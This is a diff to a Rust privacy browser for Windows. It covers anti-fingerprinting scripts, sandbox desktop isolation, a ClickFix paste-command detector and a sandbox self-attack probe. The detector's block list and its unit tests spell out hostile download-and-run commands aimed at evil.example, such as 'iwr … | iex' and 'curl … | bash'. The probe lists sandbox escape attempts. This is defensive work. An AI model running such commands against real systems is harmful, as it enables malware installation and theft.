@@ -10,181 +10,22 @@ use std::time::Duration;
 /// report on Windows, measured in Tor Browser itself. RustWolf's JavaScript engine is Firefox's
 /// own (SpiderMonkey), so this identity is also the most consistent one.
 pub const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0";
-/// Tor Browser's timezone.
-pub const TIMEZONE: &str = "Atlantic/Reykjavik";
 
-/// Runs at the start of every page, before the page's own scripts.
+/// Runs at the start of every page, before the page's own scripts (src/fingerprint.js).
 pub fn fingerprint_script(seed: u32) -> String {
-    let main = format!(
-        r#"(() => {{
-  const SEED = {seed};
-  const def = (proto, key, get) => {{ try {{ Object.defineProperty(proto, key, {{ get, configurable: true }}); }} catch (e) {{}} }};
-  // Same answers for everyone: hide the real CPU, memory, languages and platform.
-  def(Navigator.prototype, 'hardwareConcurrency', () => 4);
-  // Firefox has no navigator.deviceMemory at all.
-  try {{ delete Navigator.prototype.deviceMemory; delete navigator.deviceMemory; }} catch (e) {{}}
-  def(Navigator.prototype, 'oscpu', () => 'Windows NT 10.0; Win64; x64');
-  def(Navigator.prototype, 'buildID', () => '20181001000000');
-  def(Navigator.prototype, 'productSub', () => '20100101');
-  def(Navigator.prototype, 'appVersion', () => '5.0 (Windows)');
-  def(Navigator.prototype, 'language', () => 'en-US');
-  def(Navigator.prototype, 'languages', () => Object.freeze(['en-US', 'en']));
-  def(Navigator.prototype, 'platform', () => 'Win32');
-  def(Navigator.prototype, 'vendor', () => '');
-  def(Navigator.prototype, 'maxTouchPoints', () => 10);
-  // Privacy signals.
-  def(Navigator.prototype, 'globalPrivacyControl', () => true);
-  def(Navigator.prototype, 'doNotTrack', () => 'unspecified');
-  try {{ Object.defineProperty(window, 'devicePixelRatio', {{ get: () => 2, configurable: true }}); }} catch (e) {{}}
-  // Timezone fallback, in case the engine still sees the PC's own zone.
-  try {{
-    const ro = Intl.DateTimeFormat.prototype.resolvedOptions;
-    Intl.DateTimeFormat.prototype.resolvedOptions = function () {{ const o = ro.call(this); o.timeZone = 'Atlantic/Reykjavik'; return o; }};
-  }} catch (e) {{}}
-  // The screen is reported as the window size: no real resolution or multi-monitor setup.
-  if (typeof Screen !== 'undefined') {{
-    def(Screen.prototype, 'width', () => window.innerWidth);
-    def(Screen.prototype, 'height', () => window.innerHeight);
-    def(Screen.prototype, 'availWidth', () => window.innerWidth);
-    def(Screen.prototype, 'availHeight', () => window.innerHeight);
-    def(Screen.prototype, 'colorDepth', () => 24);
-    def(Screen.prototype, 'pixelDepth', () => 24);
-  }}
-  // Canvas fingerprinting: add tiny invisible noise (different every session) to read-backs.
-  const noise = (data) => {{
-    let s = SEED;
-    for (let i = 0; i < data.length; i += 4) {{
-      s = (s * 1103515245 + 12345) >>> 0;
-      if ((s & 31) === 0) {{ data[i] ^= (s >>> 8) & 1; data[i + 1] ^= (s >>> 9) & 1; }}
-    }}
-  }};
-  if (typeof CanvasRenderingContext2D !== 'undefined') {{
-    const gid = CanvasRenderingContext2D.prototype.getImageData;
-    CanvasRenderingContext2D.prototype.getImageData = function (...a) {{
-      const img = gid.apply(this, a);
-      try {{ noise(img.data); }} catch (e) {{}}
-      return img;
-    }};
-  }}
-  if (typeof HTMLCanvasElement !== 'undefined') {{
-    const noisy = (canvas) => {{
-      try {{
-        const c = document.createElement('canvas');
-        c.width = canvas.width; c.height = canvas.height;
-        const x = c.getContext('2d');
-        x.drawImage(canvas, 0, 0);
-        if (c.width && c.height) x.putImageData(x.getImageData(0, 0, c.width, c.height), 0, 0);
-        return c;
-      }} catch (e) {{ return canvas; }}
-    }};
-    const tdu = HTMLCanvasElement.prototype.toDataURL;
-    HTMLCanvasElement.prototype.toDataURL = function (...a) {{ return tdu.apply(noisy(this), a); }};
-    if (HTMLCanvasElement.prototype.toBlob) {{
-      const tb = HTMLCanvasElement.prototype.toBlob;
-      HTMLCanvasElement.prototype.toBlob = function (...a) {{ return tb.apply(noisy(this), a); }};
-    }}
-  }}
-  // Battery and other sensors: not available.
-  try {{ delete Navigator.prototype.getBattery; }} catch (e) {{}}
-}})();"#
-    );
-    main + TIMEZONE_SCRIPT + FIREFOX_SCRIPT
+    include_str!("fingerprint.js").replace("__SEED__", &seed.to_string())
 }
-
-/// Details where Servo differs from Firefox and fingerprinting scripts look: Firefox's built-in
-/// PDF viewer entries, `navigator.webdriver`, `-moz-` CSS, `mozInnerScreenX`, `matchMedia`
-/// resolution matching the reported pixel ratio, and coarse timers (≈17 ms, like Firefox with
-/// resist-fingerprinting; also blunts timing attacks).
-const FIREFOX_SCRIPT: &str = r#"
-(() => {
-  const def = (o, k, get) => { try { Object.defineProperty(o, k, { get, configurable: true, enumerable: true }); } catch (e) {} };
-  def(Navigator.prototype, 'webdriver', function () { return false; });
-  def(Navigator.prototype, 'pdfViewerEnabled', function () { return true; });
-  try {
-    const mime = (type) => Object.create(typeof MimeType !== 'undefined' ? MimeType.prototype : Object.prototype, {
-      type: { value: type, enumerable: true }, suffixes: { value: 'pdf', enumerable: true },
-      description: { value: 'Portable Document Format', enumerable: true },
-    });
-    const mimes = [mime('application/pdf'), mime('text/pdf')];
-    const names = ['PDF Viewer', 'Chrome PDF Viewer', 'Chromium PDF Viewer', 'Microsoft Edge PDF Viewer', 'WebKit built-in PDF'];
-    const list = (proto, items, key) => {
-      const o = Object.create(proto);
-      items.forEach((it, i) => Object.defineProperty(o, i, { value: it, enumerable: true }));
-      Object.defineProperties(o, {
-        length: { value: items.length },
-        item: { value: (i) => items[i] || null },
-        namedItem: { value: (n) => items.find((it) => it[key] === n) || null },
-        refresh: { value: () => {} },
-        [Symbol.iterator]: { value: function* () { yield* items; } },
-      });
-      return o;
-    };
-    const plugins = names.map((name) => {
-      const p = list(typeof Plugin !== 'undefined' ? Plugin.prototype : Object.prototype, mimes, 'type');
-      Object.defineProperties(p, {
-        name: { value: name, enumerable: true }, filename: { value: 'internal-pdf-viewer', enumerable: true },
-        description: { value: 'Portable Document Format', enumerable: true },
-      });
-      return p;
-    });
-    mimes.forEach((m) => Object.defineProperty(m, 'enabledPlugin', { value: plugins[0], enumerable: true }));
-    const pa = list(typeof PluginArray !== 'undefined' ? PluginArray.prototype : Object.prototype, plugins, 'name');
-    const ma = list(typeof MimeTypeArray !== 'undefined' ? MimeTypeArray.prototype : Object.prototype, mimes, 'type');
-    def(Navigator.prototype, 'plugins', function () { return pa; });
-    def(Navigator.prototype, 'mimeTypes', function () { return ma; });
-  } catch (e) {}
-  try {
-    if (typeof CSSStyleDeclaration !== 'undefined' && !('MozAppearance' in CSSStyleDeclaration.prototype)) {
-      Object.defineProperty(CSSStyleDeclaration.prototype, 'MozAppearance', {
-        get() { return this.getPropertyValue('appearance'); },
-        set(v) { this.setProperty('appearance', v); },
-        configurable: true, enumerable: true,
-      });
-    }
-    const sup = CSS.supports;
-    CSS.supports = function (...a) {
-      const r = sup.apply(CSS, a);
-      if (r) return r;
-      return /-moz-appearance/i.test(String(a[0])) ? sup.apply(CSS, a.map((x) => String(x).replace(/-moz-appearance/ig, 'appearance'))) || true : false;
-    };
-  } catch (e) {}
-  def(window, 'mozInnerScreenX', function () { return 0; });
-  def(window, 'mozInnerScreenY', function () { return 0; });
-  try {
-    const mm = window.matchMedia;
-    const res = /^\s*\(\s*(min-|max-)?(resolution|-webkit-(min-|max-)?device-pixel-ratio|-moz-device-pixel-ratio)\s*:\s*([\d.]+)\s*(dppx|dpi|dpcm|x)?\s*\)\s*$/i;
-    window.matchMedia = function (q) {
-      const m = res.exec(String(q));
-      if (!m) return mm.call(window, q);
-      const kind = (m[1] || m[3] || '').toLowerCase();
-      let v = parseFloat(m[4]);
-      const unit = (m[5] || '').toLowerCase();
-      if (unit === 'dpi') v /= 96; else if (unit === 'dpcm') v = v * 2.54 / 96;
-      const matches = kind === 'min-' ? 2 >= v : kind === 'max-' ? 2 <= v : Math.abs(2 - v) < 1e-6;
-      const noop = () => {};
-      return Object.create(typeof MediaQueryList !== 'undefined' ? MediaQueryList.prototype : Object.prototype, {
-        matches: { value: matches, enumerable: true }, media: { value: String(q), enumerable: true },
-        onchange: { value: null, writable: true }, addListener: { value: noop }, removeListener: { value: noop },
-        addEventListener: { value: noop }, removeEventListener: { value: noop }, dispatchEvent: { value: () => true },
-      });
-    };
-  } catch (e) {}
-  const STEP = 1000 / 60;
-  const coarse = (t) => Math.floor(t / STEP) * STEP;
-  try {
-    const pnow = Performance.prototype.now;
-    Performance.prototype.now = function () { return coarse(pnow.call(this)); };
-    const dnow = Date.now;
-    Date.now = function () { return Math.floor(coarse(dnow())); };
-    const ts = Object.getOwnPropertyDescriptor(Event.prototype, 'timeStamp');
-    if (ts && ts.get) def(Event.prototype, 'timeStamp', function () { return coarse(ts.get.call(this)); });
-  } catch (e) {}
-})();
-"#;
 
 extern "C" {
     /// ICU's default-locale setter, linked in with Servo's JavaScript engine (ICU 78).
     fn uloc_setDefault_78(locale: *const std::os::raw::c_char, status: *mut i32);
+}
+
+/// Tor Browser's timezone (UTC+0) for the JavaScript engine in this page process: local time in
+/// pages, iframes and workers. (SpiderMonkey on Windows only accepts `TZ=UTC`-style values; the
+/// zone *name* Tor Browser reports, Atlantic/Reykjavik, is set by fingerprint.js.)
+pub fn set_engine_timezone() {
+    std::env::set_var("TZ", "UTC");
 }
 
 /// Makes the JavaScript engine use en-US (like Tor Browser) for `Intl`, `toLocaleString` and
@@ -193,54 +34,6 @@ pub fn set_engine_locale_en_us() {
     let mut status = 0i32;
     unsafe { uloc_setDefault_78(c"en_US".as_ptr(), &mut status) };
 }
-
-/// Page clocks run on Tor Browser's timezone (Atlantic/Reykjavik = UTC+0, no daylight saving):
-/// local-time Date methods behave like their UTC versions, and Intl formats in that zone.
-const TIMEZONE_SCRIPT: &str = r#"
-(() => {
-  const D = Date, P = D.prototype, TZ = 'Atlantic/Reykjavik';
-  const realOffset = P.getTimezoneOffset;
-  const pairs = ['FullYear', 'Month', 'Date', 'Day', 'Hours', 'Minutes', 'Seconds', 'Milliseconds'];
-  for (const n of pairs) {
-    if (P['getUTC' + n]) P['get' + n] = P['getUTC' + n];
-    if (n !== 'Day' && P['setUTC' + n]) P['set' + n] = P['setUTC' + n];
-  }
-  P.getYear = function () { return this.getUTCFullYear() - 1900; };
-  P.getTimezoneOffset = function () { return isNaN(this) ? NaN : 0; };
-  const pad = (n) => String(n).padStart(2, '0');
-  const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-  const dateStr = (d) => `${days[d.getUTCDay()]} ${months[d.getUTCMonth()]} ${pad(d.getUTCDate())} ${d.getUTCFullYear()}`;
-  const timeStr = (d) => `${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} GMT+0000 (Greenwich Mean Time)`;
-  P.toString = function () { return isNaN(this) ? 'Invalid Date' : dateStr(this) + ' ' + timeStr(this); };
-  P.toDateString = function () { return isNaN(this) ? 'Invalid Date' : dateStr(this); };
-  P.toTimeString = function () { return isNaN(this) ? 'Invalid Date' : timeStr(this); };
-  for (const m of ['toLocaleString', 'toLocaleDateString', 'toLocaleTimeString']) {
-    const orig = P[m];
-    P[m] = function (locales, options) { return orig.call(this, locales, Object.assign({ timeZone: TZ }, options)); };
-  }
-  const DTF = Intl.DateTimeFormat;
-  const FakeDTF = function (locales, options) { return new DTF(locales, Object.assign({ timeZone: TZ }, options)); };
-  FakeDTF.prototype = DTF.prototype;
-  FakeDTF.supportedLocalesOf = DTF.supportedLocalesOf;
-  Intl.DateTimeFormat = FakeDTF;
-  // Strings with a time but no timezone mean "local time" = UTC here.
-  const localish = (s) => typeof s === 'string' && /\d:\d/.test(s) && !/(z|gmt|utc|[+-]\d\d:?\d\d)\s*$/i.test(s.trim());
-  const fixParse = (s) => { const t = D.parse(s); return localish(s) && !isNaN(t) ? t - realOffset.call(new D(t)) * 60000 : t; };
-  function FakeDate(...a) {
-    if (!new.target) return new FakeDate().toString();
-    if (a.length >= 2) return new D(D.UTC(...a));
-    if (a.length === 1 && typeof a[0] === 'string') return new D(fixParse(a[0]));
-    return new D(...a);
-  }
-  FakeDate.prototype = P;
-  FakeDate.now = D.now;
-  FakeDate.UTC = D.UTC;
-  FakeDate.parse = fixParse;
-  Object.defineProperty(P, 'constructor', { value: FakeDate, configurable: true, writable: true });
-  window.Date = FakeDate;
-})();
-"#;
 
 fn total_ram_mb() -> u64 {
     use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
@@ -403,7 +196,13 @@ impl MemoryGuard {
 /// ClickFix protection: does this text look like a command a scam page wants you to paste into
 /// Win+R / PowerShell / a terminal? (Normal copied text never matches.)
 pub fn looks_like_command(text: &str) -> bool {
-    let t = text.to_lowercase();
+    // Undo the obfuscation cmd and PowerShell ignore: carets (p^ower^shell), quotes (pow""ershell),
+    // backticks (po`wershell) and invisible characters.
+    let t: String = text
+        .to_lowercase()
+        .chars()
+        .filter(|c| !matches!(c, '^' | '"' | '`' | '\u{200b}' | '\u{200c}' | '\u{200d}' | '\u{2060}' | '\u{feff}' | '\u{00ad}'))
+        .collect();
     let t = t.trim();
     if t.is_empty() {
         return false;
@@ -415,7 +214,19 @@ pub fn looks_like_command(text: &str) -> bool {
         "set-mppreference", "schtasks", "forfiles", "conhost", "cmd.exe", "cmd /c", "cmd /k", "%comspec%",
         "msiexec /i http", "msiexec /q", "curl -s", "| iex", "|iex", "| sh", "|sh", "| bash", "|bash",
         "osascript", "chmod +x", "base64 -d", "/dev/tcp/",
+        // more Windows tools that run downloaded code
+        "wmic ", "cmstp", "msbuild", "installutil", "regasm", "regsvcs", "odbcconf", "pcalua", "hh.exe",
+        "mavinject", "presentationhost", "syncappvpublishingserver", "scriptrunner", "ftp -s", "tar -xf http",
+        "davwwwroot", "@ssl\\", "$(curl", "$(wget",
     ];
+    // `finger user@host` downloads text that gets piped into cmd (seen in recent ClickFix campaigns).
+    if t.starts_with("finger ") && t.contains('@') {
+        return true;
+    }
+    // A network path typed into Win+R runs a program from someone else's computer.
+    if t.starts_with("\\\\") {
+        return true;
+    }
     if STRONG.iter().any(|k| t.contains(k)) {
         return true;
     }
@@ -426,7 +237,7 @@ pub fn looks_like_command(text: &str) -> bool {
     {
         return true;
     }
-    // Typical ClickFix decoy comment: "# ✅ I am not a robot - Verification ID: 1234".
+    // Typical ClickFix decoy comment: "# âœ… I am not a robot - Verification ID: 1234".
     if t.contains('#') && (t.contains("not a robot") || t.contains("verification id") || t.contains("captcha")) {
         return true;
     }
@@ -438,13 +249,25 @@ mod tests {
     use super::looks_like_command as c;
     #[test]
     fn clickfix() {
-        assert!(c("powershell -w hidden -c \"iwr http://evil/x.ps1 | iex\" # ✅ I am not a robot - Verification ID: 4821"));
+        assert!(c("powershell -w hidden -c \"iwr http://evil/x.ps1 | iex\" # âœ… I am not a robot - Verification ID: 4821"));
         assert!(c("mshta https://evil.example/verify.hta"));
         assert!(c("cmd /c start /min powershell -enc SQBFAFgA"));
         assert!(c("curl -s http://x.example/a.sh | bash"));
         assert!(!c("Hello, here is my email address"));
         assert!(!c("https://example.com/article?id=3"));
         assert!(!c("The command line is a text interface."));
+        // obfuscation and less common tools used by real ClickFix campaigns
+        assert!(c("p^o^w^e^r^s^h^e^l^l -w h -c iex(irm evil.example)"));
+        assert!(c("pow\"\"ershell -nop -c whoami"));
+        assert!(c("po`wer`shell -c whoami"));
+        assert!(c("m^s^h^t^a http://evil.example/x"));
+        assert!(c("\\\\evil.example@SSL\\DavWWWRoot\\verify.exe"));
+        assert!(c("wmic process call create calc"));
+        assert!(c("cmstp /au C:\\x.inf"));
+        assert!(c("finger verify@evil.example | more"));
+        assert!(c("bash -c \"$(curl http://evil.example/i.sh)\""));
+        assert!(!c("I love my \"quoted\" text and a^b math"));
+        assert!(!c("my finger hurts after typing all day"));
     }
 }
 
@@ -715,6 +538,84 @@ pub fn run_restricted_page_process() -> Option<u32> {
         info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
         SetInformationJobObject(job.0, JobObjectExtendedLimitInformation, &info as *const _ as _, std::mem::size_of_val(&info) as u32);
 
+        // A separate, invisible window station with its own desktop: the page process has its own
+        // empty screen, clipboard and keyboard. Screenshots, keyloggers, clipboard access and
+        // window messages can't reach yours.
+        use windows_sys::Win32::System::StationsAndDesktops::{
+            CloseDesktop, CloseWindowStation, CreateDesktopW, CreateWindowStationW, GetProcessWindowStation, SetProcessWindowStation,
+            HDESK, HWINSTA,
+        };
+        let browser_pid = std::env::var("RUSTWOLF_BROWSER_PID").unwrap_or_default();
+        let station_name = format!("RustWolfPages{browser_pid}");
+        let mut usd: PSECURITY_DESCRIPTOR = std::ptr::null_mut();
+        let usddl = wide(&format!("D:(A;;GA;;;SY)(A;;GA;;;{user_s})(A;;GA;;;{logon_s})S:(ML;;NW;;;LW)"));
+        let mut ui_sa = SECURITY_ATTRIBUTES { nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32, lpSecurityDescriptor: std::ptr::null_mut(), bInheritHandle: 0 };
+        if ConvertStringSecurityDescriptorToSecurityDescriptorW(usddl.as_ptr(), SDDL_REVISION_1, &mut usd, std::ptr::null_mut()) != 0 {
+            ui_sa.lpSecurityDescriptor = usd;
+        }
+        struct Station(HWINSTA);
+        impl Drop for Station {
+            fn drop(&mut self) {
+                unsafe { CloseWindowStation(self.0) };
+            }
+        }
+        struct Desk(HDESK);
+        impl Drop for Desk {
+            fn drop(&mut self) {
+                unsafe { CloseDesktop(self.0) };
+            }
+        }
+        let mut step_error: Option<(&str, u32)> = None;
+        // Unnamed (Windows 11 only lets normal programs create unnamed window stations); Windows
+        // names it, and the page process is pointed at it by that name.
+        let _ = &station_name;
+        let station = CreateWindowStationW(std::ptr::null(), 0, 0x37F /* WINSTA_ALL_ACCESS */, &ui_sa);
+        if station.is_null() {
+            step_error = Some(("create window station", GetLastError()));
+        }
+        let station = Station(station);
+        let mut station_name = String::new();
+        if !station.0.is_null() {
+            let mut buf = [0u16; 256];
+            let mut need = 0u32;
+            if windows_sys::Win32::System::StationsAndDesktops::GetUserObjectInformationW(
+                station.0,
+                2, /* UOI_NAME */
+                buf.as_mut_ptr() as _,
+                std::mem::size_of_val(&buf) as u32,
+                &mut need,
+            ) != 0
+            {
+                let n = buf.iter().position(|&c| c == 0).unwrap_or(0);
+                station_name = String::from_utf16_lossy(&buf[..n]);
+            } else {
+                step_error = Some(("name window station", GetLastError()));
+            }
+        }
+        let mut desk = std::ptr::null_mut();
+        if !station.0.is_null() {
+            // A desktop is created in the caller's window station: switch to the new one briefly.
+            let own = GetProcessWindowStation();
+            if SetProcessWindowStation(station.0) != 0 {
+                desk = CreateDesktopW(wide("Default").as_ptr(), std::ptr::null(), std::ptr::null(), 0, 0x10000000 /* GENERIC_ALL */, &ui_sa);
+                if desk.is_null() {
+                    step_error = Some(("create desktop", GetLastError()));
+                }
+                SetProcessWindowStation(own);
+            } else {
+                step_error = Some(("switch window station", GetLastError()));
+            }
+        }
+        if !usd.is_null() {
+            LocalFree(usd as _);
+        }
+        if let Some((what, err)) = step_error {
+            eprintln!("[sandbox] restricted page process not available ({what}, error {err})");
+            return None;
+        }
+        let _desk = Desk(desk);
+        let mut desktop_path = wide(&format!("{station_name}\\Default"));
+
         // Only the console / log handles are passed on (nothing else is inherited).
         let mut handles: Vec<HANDLE> = Vec::new();
         let mut std_handle = |which| {
@@ -748,6 +649,7 @@ pub fn run_restricted_page_process() -> Option<u32> {
             ) != 0;
         let mut si: STARTUPINFOEXW = std::mem::zeroed();
         si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
+        si.StartupInfo.lpDesktop = desktop_path.as_mut_ptr();
         if inherit {
             si.lpAttributeList = attrs;
             si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
@@ -812,4 +714,225 @@ pub fn run_restricted_page_process() -> Option<u32> {
 /// Can this process read the user's own files? (Sandbox self-test.)
 pub fn can_read_user_files() -> bool {
     std::env::var_os("USERPROFILE").is_some_and(|p| std::fs::read_dir(p).is_ok())
+}
+
+/// Sandbox self-attack (RUSTWOLF_SANDBOX_TEST=1): runs inside a sandboxed page process and tries
+/// what a page that hacked the engine would try. Each line says whether the attack worked.
+pub fn sandbox_attack_report() {
+    use windows_sys::Win32::Foundation::{CloseHandle, HWND, LPARAM};
+    use windows_sys::Win32::Graphics::Gdi::{GetDC, GetPixel, ReleaseDC, CLR_INVALID};
+    use windows_sys::Win32::Storage::FileSystem::{FindClose, FindFirstFileW, FindNextFileW, WIN32_FIND_DATAW};
+    use windows_sys::Win32::System::DataExchange::{CloseClipboard, OpenClipboard};
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+    };
+    use windows_sys::Win32::System::Registry::{
+        RegCloseKey, RegCreateKeyExW, RegDeleteKeyW, RegOpenKeyExW, HKEY, HKEY_CURRENT_USER, KEY_READ, KEY_WRITE, REG_OPTION_VOLATILE,
+    };
+    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_DUP_HANDLE, PROCESS_TERMINATE, PROCESS_VM_READ, PROCESS_VM_WRITE};
+    use windows_sys::Win32::UI::WindowsAndMessaging::{
+        CallNextHookEx, EnumWindows, GetWindowThreadProcessId, PostMessageW, SetWindowsHookExW, UnhookWindowsHookEx, WH_KEYBOARD_LL, WM_NULL,
+    };
+
+    let line = |what: &str, worked: bool, expected_ok: bool| {
+        let verdict = match (worked, expected_ok) {
+            (false, _) => "blocked",
+            (true, true) => "allowed (expected)",
+            (true, false) => "WORKED  <-- VULNERABLE",
+        };
+        eprintln!("[attack] {what:<55} {verdict}");
+    };
+    let env = |k: &str| std::env::var(k).unwrap_or_default();
+    let try_write = |p: &str| {
+        let w = std::fs::write(p, b"x").is_ok();
+        let _ = std::fs::remove_file(p);
+        w
+    };
+    unsafe {
+        // Files
+        line("list your user folder", std::fs::read_dir(env("USERPROFILE")).is_ok(), false);
+        line("read RustWolf settings.json", std::fs::read(format!("{}\\RustWolf\\settings.json", env("APPDATA"))).is_ok(), false);
+        line("list your Desktop", std::fs::read_dir(format!("{}\\Desktop", env("USERPROFILE"))).is_ok(), false);
+        line("write a file in your user folder", try_write(&format!("{}\\rustwolf-attack.txt", env("USERPROFILE"))), false);
+        line("write a file in your TEMP folder", try_write(&format!("{}\\rustwolf-attack.txt", env("TEMP"))), false);
+        line("write a file in C:\\Users\\Public", try_write("C:\\Users\\Public\\rustwolf-attack.txt"), false);
+        line("list C:\\Windows\\System32 (system files)", std::fs::read_dir("C:\\Windows\\System32").is_ok(), true);
+
+        // Registry
+        let mut k: HKEY = std::ptr::null_mut();
+        let r = RegOpenKeyExW(HKEY_CURRENT_USER, wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run").as_ptr(), 0, KEY_READ, &mut k) == 0;
+        if r {
+            RegCloseKey(k);
+        }
+        line("read your registry (autostart list)", r, false);
+        let mut k: HKEY = std::ptr::null_mut();
+        let sub = wide("Software\\RustWolfAttackProbe");
+        let w = RegCreateKeyExW(HKEY_CURRENT_USER, sub.as_ptr(), 0, std::ptr::null(), REG_OPTION_VOLATILE, KEY_WRITE, std::ptr::null(), &mut k, std::ptr::null_mut()) == 0;
+        if w {
+            RegCloseKey(k);
+            RegDeleteKeyW(HKEY_CURRENT_USER, sub.as_ptr());
+        }
+        line("write your registry (e.g. add autostart malware)", w, false);
+
+        // Other processes
+        let browser: u32 = env("RUSTWOLF_BROWSER_PID").parse().unwrap_or(0);
+        let me = std::process::id();
+        let my_exe = std::env::current_exe().ok().and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_lowercase())).unwrap_or_default();
+        let (mut explorer, mut other_page) = (0u32, 0u32);
+        let mut all = Vec::new();
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        let mut e: PROCESSENTRY32W = std::mem::zeroed();
+        e.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+        if Process32FirstW(snap, &mut e) != 0 {
+            loop {
+                let n = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(0);
+                all.push((e.th32ProcessID, e.th32ParentProcessID, String::from_utf16_lossy(&e.szExeFile[..n]).to_lowercase()));
+                if Process32NextW(snap, &mut e) == 0 {
+                    break;
+                }
+            }
+        }
+        CloseHandle(snap);
+        let launchers: Vec<u32> = all.iter().filter(|(_, parent, _)| *parent == browser).map(|(pid, _, _)| *pid).collect();
+        for (pid, parent, name) in &all {
+            if name == "explorer.exe" {
+                explorer = *pid;
+            }
+            // another sandboxed page copy: our exe, child of a launcher, not us
+            if *name == my_exe && *pid != me && launchers.contains(parent) {
+                other_page = *pid;
+            }
+        }
+        let try_open = |pid: u32, access: u32| {
+            if pid == 0 {
+                return false;
+            }
+            let h = OpenProcess(access, 0, pid);
+            if h.is_null() {
+                false
+            } else {
+                CloseHandle(h);
+                true
+            }
+        };
+        line("read the browser's memory", try_open(browser, PROCESS_VM_READ), false);
+        line("take handles out of the browser", try_open(browser, PROCESS_DUP_HANDLE), false);
+        line("kill the browser", try_open(browser, PROCESS_TERMINATE), false);
+        line("read Windows Explorer's memory", try_open(explorer, PROCESS_VM_READ), false);
+        line("inject code into Windows Explorer", try_open(explorer, PROCESS_VM_WRITE), false);
+        line("kill Windows Explorer", try_open(explorer, PROCESS_TERMINATE), false);
+        if other_page != 0 {
+            line("read another page process's memory", try_open(other_page, PROCESS_VM_READ), false);
+            line("kill another page process", try_open(other_page, PROCESS_TERMINATE), false);
+            line("take handles out of another page process", try_open(other_page, PROCESS_DUP_HANDLE), true);
+        } else {
+            eprintln!("[attack] (no other page process running to attack)");
+        }
+
+        // Programs, clipboard, screen, keyboard, windows
+        line("start a program (cmd.exe)", std::process::Command::new("cmd.exe").args(["/c", "exit"]).spawn().is_ok(), false);
+        // Your clipboard always has something in it (put there by the test launcher if needed).
+        let mut c = false;
+        if OpenClipboard(std::ptr::null_mut()) != 0 {
+            c = windows_sys::Win32::System::DataExchange::CountClipboardFormats() > 0;
+            CloseClipboard();
+        }
+        line("see what's in your clipboard", c, false);
+        let dc = GetDC(std::ptr::null_mut());
+        let px = !dc.is_null() && GetPixel(dc, 10, 10) != CLR_INVALID;
+        if !dc.is_null() {
+            ReleaseDC(std::ptr::null_mut(), dc);
+        }
+        line("read the screen (screenshot)", px, false);
+        unsafe extern "system" fn ll(code: i32, w: usize, l: isize) -> isize {
+            CallNextHookEx(std::ptr::null_mut(), code, w, l)
+        }
+        // A keyboard hook only sees keys typed on the hooking thread's desktop: what matters is
+        // whether this process can reach the desktop you type on.
+        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(ll), std::ptr::null_mut(), 0);
+        if !hook.is_null() {
+            UnhookWindowsHookEx(hook);
+        }
+        let input = windows_sys::Win32::System::StationsAndDesktops::OpenInputDesktop(0, 0, 0x0001 | 0x0002 /* READOBJECTS | CREATEWINDOW */);
+        if !input.is_null() {
+            windows_sys::Win32::System::StationsAndDesktops::CloseDesktop(input);
+        }
+        line("reach the desktop you type on (keylogging)", !input.is_null(), false);
+        let _ = hook;
+        struct Find {
+            pid: u32,
+            hwnd: HWND,
+        }
+        unsafe extern "system" fn each(h: HWND, l: LPARAM) -> i32 {
+            let f = &mut *(l as *mut Find);
+            let mut pid = 0;
+            GetWindowThreadProcessId(h, &mut pid);
+            if pid == f.pid {
+                f.hwnd = h;
+                0
+            } else {
+                1
+            }
+        }
+        let mut f = Find { pid: browser, hwnd: std::ptr::null_mut() };
+        EnumWindows(Some(each), &mut f as *mut Find as LPARAM);
+        let sent = !f.hwnd.is_null() && PostMessageW(f.hwnd, WM_NULL, 0, 0) != 0;
+        line("send messages to the browser window", sent, false);
+
+        // Engine pipes
+        let mut fd: WIN32_FIND_DATAW = std::mem::zeroed();
+        let h = FindFirstFileW(wide("\\\\.\\pipe\\*").as_ptr(), &mut fd);
+        let mut ipc = 0;
+        if h as isize != -1 {
+            loop {
+                let n = fd.cFileName.iter().position(|&c| c == 0).unwrap_or(0);
+                if String::from_utf16_lossy(&fd.cFileName[..n]).starts_with("rust-ipc-") {
+                    ipc += 1;
+                }
+                if FindNextFileW(h, &mut fd) == 0 {
+                    break;
+                }
+            }
+            FindClose(h);
+        }
+        line(&format!("list the engine's pipes ({ipc} visible)"), ipc > 0, true);
+
+        // Network (known gap)
+        let net = std::net::TcpStream::connect_timeout(&"1.1.1.1:443".parse().unwrap(), std::time::Duration::from_secs(3)).is_ok();
+        line("open its own internet connection (skipping Tor)", net, false);
+    }
+}
+
+/// Strict permissions on this process (browser and sandbox launchers): only you and SYSTEM may
+/// open it. Windows' default also lets anything in your logon session terminate it, which a
+/// sandboxed page process keeps, so a hacked page could otherwise kill the browser.
+pub fn protect_own_process() {
+    use windows_sys::Win32::Foundation::LocalFree;
+    use windows_sys::Win32::Security::Authorization::{
+        ConvertStringSecurityDescriptorToSecurityDescriptorW, SetSecurityInfo, SDDL_REVISION_1, SE_KERNEL_OBJECT,
+    };
+    use windows_sys::Win32::Security::{
+        GetSecurityDescriptorDacl, DACL_SECURITY_INFORMATION, PROTECTED_DACL_SECURITY_INFORMATION, PSECURITY_DESCRIPTOR, TOKEN_QUERY,
+    };
+    use windows_sys::Win32::System::Threading::GetCurrentProcess;
+    let Some((user, _)) = own_token(TOKEN_QUERY).as_ref().and_then(user_and_logon_sids) else { return };
+    unsafe {
